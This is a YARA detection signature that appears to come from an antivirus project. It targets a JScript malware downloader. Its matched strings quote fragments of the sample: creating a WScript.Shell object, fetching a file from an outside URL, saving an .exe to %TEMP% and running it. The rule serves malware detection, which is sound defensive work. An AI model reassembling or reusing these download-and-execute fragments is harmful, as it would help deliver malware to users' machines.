rule sig_20160328_9b1893deab6191c649214073a6a8763e {
  meta:
    description = "datamaliciousorder - file 20160328_9b1893deab6191c649214073a6a8763e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "32804d543fb1efd71a442e8ea94ff72e0ecff47448830d862ba0b67a7b2e74e8"

  strings:
    $s1  = "function Gzadhd() {return Wdaobevjbo[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"CxIhdRMO0bNeq5B3.exe\";};" fullword ascii
    $s2  = "do {WScript[Eqzmt](Ekxqbiqeex() * 11)} while (Vofghfy[\"readystate\"] < 4 );" fullword ascii
    $s3  = "Vofghfy[Aupjl](\"GET\", \"http://www.creative-drumschool.de/p3isakd\", false);" fullword ascii
    $s4  = "function Tmkrxrwuq(Lgvlpmjqj, Xuaop){return Lgvlpmjqj - Xuaop;};" fullword ascii
    $s5  = "var Wdaobevjbo = function Pywocat() {return WScript[Qlgilgwu](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Gqfjeagl(Sydwtxnuty){Wdaobevjbo[\"Run\"](Sydwtxnuty, Hmnldpa, Hmnldpa);};" fullword ascii
    $s7  = "function Ztpwkapdjx() {return ((Ymsgirl == true) && (Ymsgirl == Bdeblfk)) ? 1 : Hmnldpa;};" fullword ascii
    $s8  = "Bdeblfk = true; " fullword ascii
    $s9  = "function Heevqfn()" fullword ascii
    $s10 = "function Ekxqbiqeex(){return 22;};" fullword ascii
    $s11 = "var Rxpny = false;" fullword ascii
    $s12 = " while (Hoppbfbvlt){" fullword ascii
    $s13 = "var Ymsgirl = false;" fullword ascii
    $s14 = "function Plinnnmg(){return Qpnskstozc;};" fullword ascii
    $s15 = "var Bdeblfk = false;" fullword ascii
    $s16 = "function Hwogepisx(){return Qlgilgwu;};" fullword ascii
    $s17 = "Ymsgirl = true; " fullword ascii
    $s18 = "return Tmkrxrwuq(Xcvlrbzesr, Vpoud);" fullword ascii
    $s19 = "var Uzmpqufn = new this[\"Date\"]();" fullword ascii
    $s20 = "function Vnhjlusmy(Asqojxgxv) {var Mcbeore = (1, 2, 3, 4, 5, Asqojxgxv); return Mcbeore;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}